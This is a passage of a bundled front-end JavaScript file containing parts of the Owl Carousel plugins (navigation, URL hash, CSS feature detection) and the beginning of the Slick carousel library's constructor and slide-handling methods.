        t.proxy(this._overrides.to, this._core)(this.getPosition(!0), e);
      }),
      (s.prototype.prev = function (e) {
        t.proxy(this._overrides.to, this._core)(this.getPosition(!1), e);
      }),
      (s.prototype.to = function (e, i, n) {
        var s;
        !n && this._pages.length
          ? ((s = this._pages.length),
            t.proxy(this._overrides.to, this._core)(
              this._pages[((e % s) + s) % s].start,
              i
            ))
          : t.proxy(this._overrides.to, this._core)(e, i);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Navigation = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    "use strict";
    var s = function (i) {
      (this._core = i),
        (this._hashes = {}),
        (this.$element = this._core.$element),
        (this._handlers = {
          "initialized.owl.carousel": t.proxy(function (i) {
            i.namespace &&
              "URLHash" === this._core.settings.startPosition &&
              t(e).trigger("hashchange.owl.navigation");
          }, this),
          "prepared.owl.carousel": t.proxy(function (e) {
            if (e.namespace) {
              var i = t(e.content)
                .find("[data-hash]")
                .addBack("[data-hash]")
                .attr("data-hash");
              if (!i) return;
              this._hashes[i] = e.content;
            }
          }, this),
          "changed.owl.carousel": t.proxy(function (i) {
            if (i.namespace && "position" === i.property.name) {
              var n = this._core.items(
                  this._core.relative(this._core.current())
                ),
                s = t
                  .map(this._hashes, function (t, e) {
                    return t === n ? e : null;
                  })
                  .join();
              if (!s || e.location.hash.slice(1) === s) return;
              e.location.hash = s;
            }
          }, this),
        }),
        (this._core.options = t.extend({}, s.Defaults, this._core.options)),
        this.$element.on(this._handlers),
        t(e).on(
          "hashchange.owl.navigation",
          t.proxy(function (t) {
            var i = e.location.hash.substring(1),
              n = this._core.$stage.children(),
              s = this._hashes[i] && n.index(this._hashes[i]);
            undefined !== s &&
              s !== this._core.current() &&
              this._core.to(this._core.relative(s), !1, !0);
          }, this)
        );
    };
    (s.Defaults = { URLhashListener: !1 }),
      (s.prototype.destroy = function () {
        var i, n;
        for (i in (t(e).off("hashchange.owl.navigation"), this._handlers))
          this._core.$element.off(i, this._handlers[i]);
        for (n in Object.getOwnPropertyNames(this))
          "function" != typeof this[n] && (this[n] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Hash = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    function s(e, i) {
      var n = !1,
        s = e.charAt(0).toUpperCase() + e.slice(1);
      return (
        t.each((e + " " + a.join(s + " ") + s).split(" "), function (t, e) {
          if (undefined !== r[e]) return (n = !i || e), !1;
        }),
        n
      );
    }
    function o(t) {
      return s(t, !0);
    }
    var r = t("<support>").get(0).style,
      a = "Webkit Moz O ms".split(" "),
      l = {
        transition: {
          end: {
            WebkitTransition: "webkitTransitionEnd",
            MozTransition: "transitionend",
            OTransition: "oTransitionEnd",
            transition: "transitionend",
          },
        },
        animation: {
          end: {
            WebkitAnimation: "webkitAnimationEnd",
            MozAnimation: "animationend",
            OAnimation: "oAnimationEnd",
            animation: "animationend",
          },
        },
      },
      c = function () {
        return !!s("transform");
      },
      u = function () {
        return !!s("perspective");
      },
      d = function () {
        return !!s("animation");
      };
    (function () {
      return !!s("transition");
    })() &&
      ((t.support.transition = new String(o("transition"))),
      (t.support.transition.end = l.transition.end[t.support.transition])),
      d() &&
        ((t.support.animation = new String(o("animation"))),
        (t.support.animation.end = l.animation.end[t.support.animation])),
      c() &&
        ((t.support.transform = new String(o("transform"))),
        (t.support.transform3d = u()));
  })(window.Zepto || window.jQuery, window, document),
  (function (t) {
    "use strict";
    "function" == typeof define && define.amd
      ? define(["jquery"], t)
      : "undefined" != typeof exports
      ? (module.exports = t(require("jquery")))
      : t(jQuery);
  })(function (t) {
    "use strict";
    var e,
      i = window.Slick || {};
    (e = 0),
      ((i = function (i, n) {
        var s,
          o = this;
        (o.defaults = {
          accessibility: !0,
          adaptiveHeight: !1,
          appendArrows: t(i),
          appendDots: t(i),
          arrows: !0,
          asNavFor: null,
          prevArrow:
            '<button class="slick-prev" aria-label="Previous" type="button">Pre</button>',
          nextArrow:
            '<button class="slick-next" aria-label="Next" type="button">Nxt</button>',
          autoplay: !1,
          autoplaySpeed: 3e3,
          centerMode: !1,
          centerPadding: "50px",
          cssEase: "ease",
          customPaging: function (e, i) {
            return t('<button type="button" />').text(i + 1);
          },
          dots: !1,
          dotsClass: "slick-dots",
          draggable: !0,
          easing: "linear",
          edgeFriction: 0.35,
          fade: !1,
          focusOnSelect: !1,
          focusOnChange: !1,
          infinite: !0,
          initialSlide: 0,
          lazyLoad: "ondemand",
          mobileFirst: !1,
          pauseOnHover: !0,
          pauseOnFocus: !0,
          pauseOnDotsHover: !1,
          respondTo: "window",
          responsive: null,
          rows: 1,
          rtl: !1,
          slide: "",
          slidesPerRow: 1,
          slidesToShow: 1,
          slidesToScroll: 1,
          speed: 500,
          swipe: !0,
          swipeToSlide: !1,
          touchMove: !0,
          touchThreshold: 5,
          useCSS: !0,
          useTransform: !0,
          variableWidth: !1,
          vertical: !1,
          verticalSwiping: !1,
          waitForAnimate: !0,
          zIndex: 1e3,
        }),
          (o.initials = {
            animating: !1,
            dragging: !1,
            autoPlayTimer: null,
            currentDirection: 0,
            currentLeft: null,
            currentSlide: 0,
            direction: 1,
            $dots: null,
            listWidth: null,
            listHeight: null,
            loadIndex: 0,
            $nextArrow: null,
            $prevArrow: null,
            scrolling: !1,
            slideCount: null,
            slideWidth: null,
            $slideTrack: null,
            $slides: null,
            sliding: !1,
            slideOffset: 0,
            swipeLeft: null,
            swiping: !1,
            $list: null,
            touchObject: {},
            transformsEnabled: !1,
            unslicked: !1,
          }),
          t.extend(o, o.initials),
          (o.activeBreakpoint = null),
          (o.animType = null),
          (o.animProp = null),
          (o.breakpoints = []),
          (o.breakpointSettings = []),
          (o.cssTransitions = !1),
          (o.focussed = !1),
          (o.interrupted = !1),
          (o.hidden = "hidden"),
          (o.paused = !0),
          (o.positionProp = null),
          (o.respondTo = null),
          (o.rowCount = 1),
          (o.shouldClick = !0),
          (o.$slider = t(i)),
          (o.$slidesCache = null),
          (o.transformType = null),
          (o.transitionType = null),
          (o.visibilityChange = "visibilitychange"),
          (o.windowWidth = 0),
          (o.windowTimer = null),
          (s = t(i).data("slick") || {}),
          (o.options = t.extend({}, o.defaults, n, s)),
          (o.currentSlide = o.options.initialSlide),
          (o.originalSettings = o.options),
          void 0 !== document.mozHidden
            ? ((o.hidden = "mozHidden"),
              (o.visibilityChange = "mozvisibilitychange"))
            : void 0 !== document.webkitHidden &&
              ((o.hidden = "webkitHidden"),
              (o.visibilityChange = "webkitvisibilitychange")),
          (o.autoPlay = t.proxy(o.autoPlay, o)),
          (o.autoPlayClear = t.proxy(o.autoPlayClear, o)),
          (o.autoPlayIterator = t.proxy(o.autoPlayIterator, o)),
          (o.changeSlide = t.proxy(o.changeSlide, o)),
          (o.clickHandler = t.proxy(o.clickHandler, o)),
          (o.selectHandler = t.proxy(o.selectHandler, o)),
          (o.setPosition = t.proxy(o.setPosition, o)),
          (o.swipeHandler = t.proxy(o.swipeHandler, o)),
          (o.dragHandler = t.proxy(o.dragHandler, o)),
          (o.keyHandler = t.proxy(o.keyHandler, o)),
          (o.instanceUid = e++),
          (o.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/),
          o.registerBreakpoints(),
          o.init(!0);
      }).prototype.activateADA = function () {
        this.$slideTrack
          .find(".slick-active")
          .attr({ "aria-hidden": "false" })
          .find("a, input, button, select")
          .attr({ tabindex: "0" });
      }),
      (i.prototype.addSlide = i.prototype.slickAdd =
        function (e, i, n) {
          var s = this;
          if ("boolean" == typeof i) (n = i), (i = null);
          else if (i < 0 || i >= s.slideCount) return !1;
          s.unload(),
            "number" == typeof i
              ? 0 === i && 0 === s.$slides.length
                ? t(e).appendTo(s.$slideTrack)
                : n
                ? t(e).insertBefore(s.$slides.eq(i))
                : t(e).insertAfter(s.$slides.eq(i))
              : !0 === n
              ? t(e).prependTo(s.$slideTrack)
              : t(e).appendTo(s.$slideTrack),
            (s.$slides = s.$slideTrack.children(this.options.slide)),
            s.$slideTrack.children(this.options.slide).detach(),
            s.$slideTrack.append(s.$slides),
            s.$slides.each(function (e, i) {
              t(i).attr("data-slick-index", e);
            }),
            (s.$slidesCache = s.$slides),
            s.reinit();
        }),
      (i.prototype.animateHeight = function () {
        var t = this;
        if (
          1 === t.options.slidesToShow &&
          !0 === t.options.adaptiveHeight &&
          !1 === t.options.vertical
        ) {
          var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
          t.$list.animate({ height: e }, t.options.speed);
        }
      }),
      (i.prototype.animateSlide = function (e, i) {
        var n = {},
          s = this;
        s.animateHeight(),
          !0 === s.options.rtl && !1 === s.options.vertical && (e = -e),
          !1 === s.transformsEnabled
            ? !1 === s.options.vertical
              ? s.$slideTrack.animate(
                  { left: e },
                  s.options.speed,
                  s.options.easing,
                  i
                )
              : s.$slideTrack.animate(
                  { top: e },
                  s.options.speed,
                  s.options.easing,
                  i
                )
            : !1 === s.cssTransitions
            ? (!0 === s.options.rtl && (s.currentLeft = -s.currentLeft),
              t({ animStart: s.currentLeft }).animate(
                { animStart: e },
                {
                  duration: s.options.speed,
                  easing: s.options.easing,
                  step: function (t) {
                    (t = Math.ceil(t)),
                      !1 === s.options.vertical
                        ? ((n[s.animType] = "translate(" + t + "px, 0px)"),
                          s.$slideTrack.css(n))
                        : ((n[s.animType] = "translate(0px," + t + "px)"),
                          s.$slideTrack.css(n));
                  },
                  complete: function () {
                    i && i.call();
                  },
                }
              ))
            : (s.applyTransition(),
              (e = Math.ceil(e)),
              !1 === s.options.vertical
                ? (n[s.animType] = "translate3d(" + e + "px, 0px, 0px)")
                : (n[s.animType] = "translate3d(0px," + e + "px, 0px)"),
              s.$slideTrack.css(n),
              i &&
                setTimeout(function () {
                  s.disableTransition(), i.call();
                }, s.options.speed));
      }),
      (i.prototype.getNavTarget = function () {
        var e = this.options.asNavFor;
        return e && null !== e && (e = t(e).not(this.$slider)), e;
      }),
      (i.prototype.asNavFor = function (e) {
        var i = this.getNavTarget();
        null !== i &&
          "object" == typeof i &&
          i.each(function () {
            var i = t(this).slick("getSlick");
            i.unslicked || i.slideHandler(e, !0);
          });
      }),
      (i.prototype.applyTransition = function (t) {
        var e = this,
          i = {};
        !1 === e.options.fade
          ? (i[e.transitionType] =
              e.transformType +
              " " +
              e.options.speed +
              "ms " +
              e.options.cssEase)
          : (i[e.transitionType] =
              "opacity " + e.options.speed + "ms " + e.options.cssEase),
          !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i);
      }),
      (i.prototype.autoPlay = function () {
        var t = this;
        t.autoPlayClear(),
          t.slideCount > t.options.slidesToShow &&
            (t.autoPlayTimer = setInterval(
              t.autoPlayIterator,
              t.options.autoplaySpeed
            ));
      }),
      (i.prototype.autoPlayClear = function () {
        this.autoPlayTimer && clearInterval(this.autoPlayTimer);
      }),
      (i.prototype.autoPlayIterator = function () {
        var t = this,
          e = t.currentSlide + t.options.slidesToScroll;
        t.paused ||
          t.interrupted ||
          t.focussed ||
          (!1 === t.options.infinite &&
            (1 === t.direction && t.currentSlide + 1 === t.slideCount - 1
              ? (t.direction = 0)
              : 0 === t.direction &&
                ((e = t.currentSlide - t.options.slidesToScroll),
                t.currentSlide - 1 == 0 && (t.direction = 1))),
          t.slideHandler(e));
      }),
      (i.prototype.buildArrows = function () {
        var e = this;
        !0 === e.options.arrows &&
          ((e.$prevArrow = t(e.options.prevArrow).addClass("slick-arrow")),
          (e.$nextArrow = t(e.options.nextArrow).addClass("slick-arrow")),
          e.slideCount > e.options.slidesToShow
            ? (e.$prevArrow
                .removeClass("slick-hidden")
                .removeAttr("aria-hidden tabindex"),
              e.$nextArrow
                .removeClass("slick-hidden")
                .removeAttr("aria-hidden tabindex"),
              e.htmlExpr.test(e.options.prevArrow) &&
                e.$prevArrow.prependTo(e.options.appendArrows),
              e.htmlExpr.test(e.options.nextArrow) &&
                e.$nextArrow.appendTo(e.options.appendArrows),
              !0 !== e.options.infinite &&
                e.$prevArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"))
            : e.$prevArrow
                .add(e.$nextArrow)
                .addClass("slick-hidden")
                .attr({ "aria-disabled": "true", tabindex: "-1" }));
      }),
      (i.prototype.buildDots = function () {
        var e,
          i,
          n = this;
        if (!0 === n.options.dots && n.slideCount > n.options.slidesToShow) {
          for (
            n.$slider.addClass("slick-dotted"),
              i = t("<ul />").addClass(n.options.dotsClass),
              e = 0;
            e <= n.getDotCount();
            e += 1
          )
            i.append(
              t("<li />").append(n.options.customPaging.call(this, n, e))
            );
          (n.$dots = i.appendTo(n.options.appendDots)),
            n.$dots.find("li").first().addClass("slick-active");
        }
      }),
      (i.prototype.buildOut = function () {
        var e = this;
        (e.$slides = e.$slider
          .children(e.options.slide + ":not(.slick-cloned)")
          .addClass("slick-slide")),
          (e.slideCount = e.$slides.length),
          e.$slides.each(function (e, i) {
            t(i)
              .attr("data-slick-index", e)
              .data("originalStyling", t(i).attr("style") || "");
          }),
          e.$slider.addClass("slick-slider"),
          (e.$slideTrack =
            0 === e.slideCount
              ? t('<div class="slick-track"/>').appendTo(e.$slider)
              : e.$slides.wrapAll('<div class="slick-track"/>').parent()),
          (e.$list = e.$slideTrack.wrap('<div class="slick-list"/>').parent()),
          e.$slideTrack.css("opacity", 0),
          (!0 !== e.options.centerMode && !0 !== e.options.swipeToSlide) ||
            (e.options.slidesToScroll = 1),
          t("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"),
          e.setupInfinite(),
          e.buildArrows(),
          e.buildDots(),
          e.updateDots(),
          e.setSlideClasses(
            "number" == typeof e.currentSlide ? e.currentSlide : 0
          ),
          !0 === e.options.draggable && e.$list.addClass("draggable");
      }),
      (i.prototype.buildRows = function () {
        var t,
          e,
          i,
          n,
          s,
          o,
          r,
          a = this;
        if (
          ((n = document.createDocumentFragment()),
          (o = a.$slider.children()),
          a.options.rows > 0)
        ) {
          for (
            r = a.options.slidesPerRow * a.options.rows,
              s = Math.ceil(o.length / r),
              t = 0;
            t < s;
            t++
          ) {
            var l = document.createElement("div");
            for (e = 0; e < a.options.rows; e++) {
              var c = document.createElement("div");
              for (i = 0; i < a.options.slidesPerRow; i++) {
                var u = t * r + (e * a.options.slidesPerRow + i);
                o.get(u) && c.appendChild(o.get(u));
              }
              l.appendChild(c);
            }
            n.appendChild(l);
          }
          a.$slider.empty().append(n),
            a.$slider
              .children()
              .children()
              .children()
              .css({
                width: 100 / a.options.slidesPerRow + "%",
                display: "inline-block",
              });
        }
      }),
      (i.prototype.checkResponsive = function (e, i) {
        var n,
          s,
          o,
          r = this,
          a = !1,
          l = r.$slider.width(),
          c = window.innerWidth || t(window).width();
        if (
          ("window" === r.respondTo
            ? (o = c)
            : "slider" === r.respondTo
            ? (o = l)
            : "min" === r.respondTo && (o = Math.min(c, l)),
          r.options.responsive &&
            r.options.responsive.length &&
            null !== r.options.responsive)
        ) {
          for (n in ((s = null), r.breakpoints))
            r.breakpoints.hasOwnProperty(n) &&
              (!1 === r.originalSettings.mobileFirst
                ? o < r.breakpoints[n] && (s = r.breakpoints[n])
                : o > r.breakpoints[n] && (s = r.breakpoints[n]));
          null !== s
            ? null !== r.activeBreakpoint
              ? (s !== r.activeBreakpoint || i) &&
                ((r.activeBreakpoint = s),
                "unslick" === r.breakpointSettings[s]
                  ? r.unslick(s)
                  : ((r.options = t.extend(
                      {},
                      r.originalSettings,
                      r.breakpointSettings[s]
                    )),
                    !0 === e && (r.currentSlide = r.options.initialSlide),
                    r.refresh(e)),
                (a = s))
              : ((r.activeBreakpoint = s),
                "unslick" === r.breakpointSettings[s]
                  ? r.unslick(s)
                  : ((r.options = t.extend(
                      {},
                      r.originalSettings,
                      r.breakpointSettings[s]
                    )),
                    !0 === e && (r.currentSlide = r.options.initialSlide),
                    r.refresh(e)),
                (a = s))
            : null !== r.activeBreakpoint &&
              ((r.activeBreakpoint = null),
              (r.options = r.originalSettings),
              !0 === e && (r.currentSlide = r.options.initialSlide),
              r.refresh(e),
              (a = s)),
            e || !1 === a || r.$slider.trigger("breakpoint", [r, a]);
        }
      }),
      (i.prototype.changeSlide = function (e, i) {
        var n,
          s,
          o = this,
          r = t(e.currentTarget);
        switch (
          (r.is("a") && e.preventDefault(),
          r.is("li") || (r = r.closest("li")),
          (n =
            o.slideCount % o.options.slidesToScroll != 0
              ? 0
              : (o.slideCount - o.currentSlide) % o.options.slidesToScroll),
          e.data.message)
        ) {
          case "previous":
            (s =
              0 === n ? o.options.slidesToScroll : o.options.slidesToShow - n),
              o.slideCount > o.options.slidesToShow &&
                o.slideHandler(o.currentSlide - s, !1, i);
            break;
          case "next":
            (s = 0 === n ? o.options.slidesToScroll : n),
              o.slideCount > o.options.slidesToShow &&
                o.slideHandler(o.currentSlide + s, !1, i);
            break;
          case "index":
            var a =
              0 === e.data.index
                ? 0
                : e.data.index || r.index() * o.options.slidesToScroll;
            o.slideHandler(o.checkNavigable(a), !1, i),
              r.children().trigger("focus");
            break;
          default:
            return;
        }
      }),
      (i.prototype.checkNavigable = function (t) {
        var e, i;
        if (((i = 0), t > (e = this.getNavigableIndexes())[e.length - 1]))
          t = e[e.length - 1];
        else
          for (var n in e) {
            if (t < e[n]) {
              t = i;
              break;
            }
            i = e[n];
          }
        return t;
      }),
      (i.prototype.cleanUpEvents = function () {
        var e = this;
        e.options.dots &&
          null !== e.$dots &&
          (t("li", e.$dots)
            .off("click.slick", e.changeSlide)
            .off("mouseenter.slick", t.proxy(e.interrupt, e, !0))
            .off("mouseleave.slick", t.proxy(e.interrupt, e, !1)),
          !0 === e.options.accessibility &&
            e.$dots.off("keydown.slick", e.keyHandler)),
          e.$slider.off("focus.slick blur.slick"),
          !0 === e.options.arrows &&
            e.slideCount > e.options.slidesToShow &&
            (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide),
            e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide),
            !0 === e.options.accessibility &&
              (e.$prevArrow && e.$prevArrow.off("keydown.slick", e.keyHandler),
              e.$nextArrow && e.$nextArrow.off("keydown.slick", e.keyHandler))),
          e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler),
          e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler),
          e.$list.off("touchend.slick mouseup.slick", e.swipeHandler),
          e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler),
          e.$list.off("click.slick", e.clickHandler),
          t(document).off(e.visibilityChange, e.visibility),
          e.cleanUpSlideEvents(),
          !0 === e.options.accessibility &&
            e.$list.off("keydown.slick", e.keyHandler),
          !0 === e.options.focusOnSelect &&
            t(e.$slideTrack).children().off("click.slick", e.selectHandler),
          t(window).off(
            "orientationchange.slick.slick-" + e.instanceUid,
            e.orientationChange
          ),
          t(window).off("resize.slick.slick-" + e.instanceUid, e.resize),
          t("[draggable!=true]", e.$slideTrack).off(
            "dragstart",
            e.preventDefault
          ),
          t(window).off("load.slick.slick-" + e.instanceUid, e.setPosition);
      }),
      (i.prototype.cleanUpSlideEvents = function () {
        var e = this;
        e.$list.off("mouseenter.slick", t.proxy(e.interrupt, e, !0)),
          e.$list.off("mouseleave.slick", t.proxy(e.interrupt, e, !1));
      }),
      (i.prototype.cleanUpRows = function () {
        var t,
          e = this;
        e.options.rows > 0 &&
          ((t = e.$slides.children().children()).removeAttr("style"),
          e.$slider.empty().append(t));
      }),
      (i.prototype.clickHandler = function (t) {
        !1 === this.shouldClick &&
          (t.stopImmediatePropagation(),
          t.stopPropagation(),
          t.preventDefault());
      }),
      (i.prototype.destroy = function (e) {
        var i = this;
        i.autoPlayClear(),
          (i.touchObject = {}),
          i.cleanUpEvents(),
          t(".slick-cloned", i.$slider).detach(),
          i.$dots && i.$dots.remove(),
          i.$prevArrow &&
            i.$prevArrow.length &&
            (i.$prevArrow
              .removeClass("slick-disabled slick-arrow slick-hidden")
              .removeAttr("aria-hidden aria-disabled tabindex")
              .css("display", ""),
            i.htmlExpr.test(i.options.prevArrow) && i.$prevArrow.remove()),
          i.$nextArrow &&
            i.$nextArrow.length &&
            (i.$nextArrow
              .removeClass("slick-disabled slick-arrow slick-hidden")
              .removeAttr("aria-hidden aria-disabled tabindex")
              .css("display", ""),
            i.htmlExpr.test(i.options.nextArrow) && i.$nextArrow.remove()),
          i.$slides &&
            (i.$slides
              .removeClass(
                "slick-slide slick-active slick-center slick-visible slick-current"
              )
              .removeAttr("aria-hidden")
              .removeAttr("data-slick-index")
              .each(function () {
                t(this).attr("style", t(this).data("originalStyling"));
              }),
            i.$slideTrack.children(this.options.slide).detach(),
            i.$slideTrack.detach(),
            i.$list.detach(),
            i.$slider.append(i.$slides)),
          i.cleanUpRows(),
          i.$slider.removeClass("slick-slider"),
          i.$slider.removeClass("slick-initialized"),
          i.$slider.removeClass("slick-dotted"),
          (i.unslicked = !0),
          e || i.$slider.trigger("destroy", [i]);
      }),
      (i.prototype.disableTransition = function (t) {
        var e = this,
          i = {};
        (i[e.transitionType] = ""),
          !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i);
      }),
      (i.prototype.fadeSlide = function (t, e) {
        var i = this;
        !1 === i.cssTransitions
          ? (i.$slides.eq(t).css({ zIndex: i.options.zIndex }),
            i.$slides
              .eq(t)
              .animate({ opacity: 1 }, i.options.speed, i.options.easing, e))
          : (i.applyTransition(t),
            i.$slides.eq(t).css({ opacity: 1, zIndex: i.options.zIndex }),
            e &&
              setTimeout(function () {
                i.disableTransition(t), e.call();
              }, i.options.speed));
      }),
      (i.prototype.fadeSlideOut = function (t) {
        var e = this;
        !1 === e.cssTransitions
          ? e.$slides
              .eq(t)
              .animate(
                { opacity: 0, zIndex: e.options.zIndex - 2 },
                e.options.speed,
                e.options.easing
              )
          : (e.applyTransition(t),
            e.$slides.eq(t).css({ opacity: 0, zIndex: e.options.zIndex - 2 }));
      }),
      (i.prototype.filterSlides = i.prototype.slickFilter =
        function (t) {
          var e = this;
          null !== t &&
            ((e.$slidesCache = e.$slides),
            e.unload(),
            e.$slideTrack.children(this.options.slide).detach(),
            e.$slidesCache.filter(t).appendTo(e.$slideTrack),
            e.reinit());
        }),
      (i.prototype.focusHandler = function () {
        var e = this;
        e.$slider
          .off("focus.slick blur.slick")
          .on("focus.slick", "*", function (i) {
            var n = t(this);
            setTimeout(function () {
              e.options.pauseOnFocus &&
                n.is(":focus") &&
                ((e.focussed = !0), e.autoPlay());
            }, 0);
          })
          .on("blur.slick", "*", function (i) {
            t(this),
              e.options.pauseOnFocus && ((e.focussed = !1), e.autoPlay());
          });
      }),
      (i.prototype.getCurrent = i.prototype.slickCurrentSlide =
        function () {
          return this.currentSlide;
        }),
      (i.prototype.getDotCount = function () {
        var t = this,
          e = 0,
          i = 0,
          n = 0;
        if (!0 === t.options.infinite)
          if (t.slideCount <= t.options.slidesToShow) ++n;
          else
            for (; e < t.slideCount; )
              ++n,
                (e = i + t.options.slidesToScroll),
                (i +=
                  t.options.slidesToScroll <= t.options.slidesToShow
                    ? t.options.slidesToScroll
                    : t.options.slidesToShow);
        else if (!0 === t.options.centerMode) n = t.slideCount;
        else if (t.options.asNavFor)
          for (; e < t.slideCount; )
            ++n,
              (e = i + t.options.slidesToScroll),
              (i +=
                t.options.slidesToScroll <= t.options.slidesToShow
                  ? t.options.slidesToScroll
                  : t.options.slidesToShow);
        else
          n =
            1 +
            Math.ceil(
              (t.slideCount - t.options.slidesToShow) / t.options.slidesToScroll
            );
        return n - 1;
      }),
      (i.prototype.getLeft = function (t) {
        var e,
          i,
          n,
          s,
          o = this,
          r = 0;
        return (
          (o.slideOffset = 0),
          (i = o.$slides.first().outerHeight(!0)),
          !0 === o.options.infinite
            ? (o.slideCount > o.options.slidesToShow &&
                ((o.slideOffset = o.slideWidth * o.options.slidesToShow * -1),
                (s = -1),
                !0 === o.options.vertical &&
                  !0 === o.options.centerMode &&
                  (2 === o.options.slidesToShow
                    ? (s = -1.5)
                    : 1 === o.options.slidesToShow && (s = -2)),
                (r = i * o.options.slidesToShow * s)),
              o.slideCount % o.options.slidesToScroll != 0 &&
                t + o.options.slidesToScroll > o.slideCount &&
                o.slideCount > o.options.slidesToShow &&
                (t > o.slideCount
                  ? ((o.slideOffset =
                      (o.options.slidesToShow - (t - o.slideCount)) *
                      o.slideWidth *
                      -1),
                    (r =
                      (o.options.slidesToShow - (t - o.slideCount)) * i * -1))
                  : ((o.slideOffset =
                      (o.slideCount % o.options.slidesToScroll) *
                      o.slideWidth *
                      -1),
                    (r = (o.slideCount % o.options.slidesToScroll) * i * -1))))
            : t + o.options.slidesToShow > o.slideCount &&
              ((o.slideOffset =
                (t + o.options.slidesToShow - o.slideCount) * o.slideWidth),
              (r = (t + o.options.slidesToShow - o.slideCount) * i)),
          o.slideCount <= o.options.slidesToShow &&
            ((o.slideOffset = 0), (r = 0)),
          !0 === o.options.centerMode && o.slideCount <= o.options.slidesToShow
            ? (o.slideOffset =
                (o.slideWidth * Math.floor(o.options.slidesToShow)) / 2 -
                (o.slideWidth * o.slideCount) / 2)
            : !0 === o.options.centerMode && !0 === o.options.infinite
            ? (o.slideOffset +=
                o.slideWidth * Math.floor(o.options.slidesToShow / 2) -
                o.slideWidth)
            : !0 === o.options.centerMode &&
              ((o.slideOffset = 0),
              (o.slideOffset +=
                o.slideWidth * Math.floor(o.options.slidesToShow / 2))),
          (e =
            !1 === o.options.vertical
              ? t * o.slideWidth * -1 + o.slideOffset
              : t * i * -1 + r),
          !0 === o.options.variableWidth &&
            ((n =
              o.slideCount <= o.options.slidesToShow ||
              !1 === o.options.infinite
                ? o.$slideTrack.children(".slick-slide").eq(t)
                : o.$slideTrack
                    .children(".slick-slide")
                    .eq(t + o.options.slidesToShow)),
            (e =
              !0 === o.options.rtl
                ? n[0]
                  ? -1 * (o.$slideTrack.width() - n[0].offsetLeft - n.width())
                  : 0
                : n[0]
                ? -1 * n[0].offsetLeft
                : 0),
            !0 === o.options.centerMode &&
              ((n =
                o.slideCount <= o.options.slidesToShow ||
                !1 === o.options.infinite
                  ? o.$slideTrack.children(".slick-slide").eq(t)
                  : o.$slideTrack
                      .children(".slick-slide")
                      .eq(t + o.options.slidesToShow + 1)),
              (e =
                !0 === o.options.rtl
                  ? n[0]
                    ? -1 * (o.$slideTrack.width() - n[0].offsetLeft - n.width())
                    : 0
                  : n[0]
                  ? -1 * n[0].offsetLeft
                  : 0),
              (e += (o.$list.width() - n.outerWidth()) / 2))),
          e
        );
      }),
      (i.prototype.getOption = i.prototype.slickGetOption =
        function (t) {
          return this.options[t];
        }),
      (i.prototype.getNavigableIndexes = function () {
        var t,
          e = this,
          i = 0,
          n = 0,
          s = [];
        for (
          !1 === e.options.infinite
            ? (t = e.slideCount)
            : ((i = -1 * e.options.slidesToScroll),
              (n = -1 * e.options.slidesToScroll),
              (t = 2 * e.slideCount));
          i < t;

        )
          s.push(i),
            (i = n + e.options.slidesToScroll),
            (n +=
              e.options.slidesToScroll <= e.options.slidesToShow
                ? e.options.slidesToScroll
                : e.options.slidesToShow);
        return s;
      }),
      (i.prototype.getSlick = function () {
        return this;
      }),
      (i.prototype.getSlideCount = function () {
        var e,
          i,
          n,
          s = this;
        return (
          (n =
            !0 === s.options.centerMode ? Math.floor(s.$list.width() / 2) : 0),
          (i = -1 * s.swipeLeft + n),
          !0 === s.options.swipeToSlide
            ? (s.$slideTrack.find(".slick-slide").each(function (n, o) {
                var r, a;
                if (
                  ((r = t(o).outerWidth()),
                  (a = o.offsetLeft),
                  !0 !== s.options.centerMode && (a += r / 2),
                  i < a + r)
                )
                  return (e = o), !1;
              }),
              Math.abs(t(e).attr("data-slick-index") - s.currentSlide) || 1)
            : s.options.slidesToScroll
        );
      }),
      (i.prototype.goTo = i.prototype.slickGoTo =
        function (t, e) {
          this.changeSlide(
            { data: { message: "index", index: parseInt(t) } },
            e
          );
        }),
      (i.prototype.init = function (e) {
        var i = this;
        t(i.$slider).hasClass("slick-initialized") ||
          (t(i.$slider).addClass("slick-initialized"),
          i.buildRows(),
          i.buildOut(),
          i.setProps(),
          i.startLoad(),
          i.loadSlider(),
          i.initializeEvents(),
          i.updateArrows(),
          i.updateDots(),
          i.checkResponsive(!0),
          i.focusHandler()),
          e && i.$slider.trigger("init", [i]),
          !0 === i.options.accessibility && i.initADA(),
          i.options.autoplay && ((i.paused = !1), i.autoPlay());
      }),
      (i.prototype.initADA = function () {
        var e = this,
          i = Math.ceil(e.slideCount / e.options.slidesToShow),
          n = e.getNavigableIndexes().filter(function (t) {
            return t >= 0 && t < e.slideCount;
          });
        e.$slides
          .add(e.$slideTrack.find(".slick-cloned"))
          .attr({ "aria-hidden": "true", tabindex: "-1" })
          .find("a, input, button, select")
          .attr({ tabindex: "-1" }),
          null !== e.$dots &&
            (e.$slides
              .not(e.$slideTrack.find(".slick-cloned"))
              .each(function (i) {
                var s = n.indexOf(i);
                if (
                  (t(this).attr({
                    role: "tabpanel",
                    id: "slick-slide" + e.instanceUid + i,
                    tabindex: -1,
                  }),
                  -1 !== s)
                ) {
                  var o = "slick-slide-control" + e.instanceUid + s;
                  t("#" + o).length && t(this).attr({ "aria-describedby": o });
                }
              }),
            e.$dots
              .attr("role", "tablist")
              .find("li")
              .each(function (s) {
                var o = n[s];
                t(this).attr({ role: "presentation" }),
                  t(this)
                    .find("button")
                    .first()
                    .attr({
                      role: "tab",
                      id: "slick-slide-control" + e.instanceUid + s,
                      "aria-controls": "slick-slide" + e.instanceUid + o,
                      "aria-label": s + 1 + " of " + i,
                      "aria-selected": null,
                      tabindex: "-1",
                    });
              })
              .eq(e.currentSlide)
              .find("button")
              .attr({ "aria-selected": "true", tabindex: "0" })
              .end());
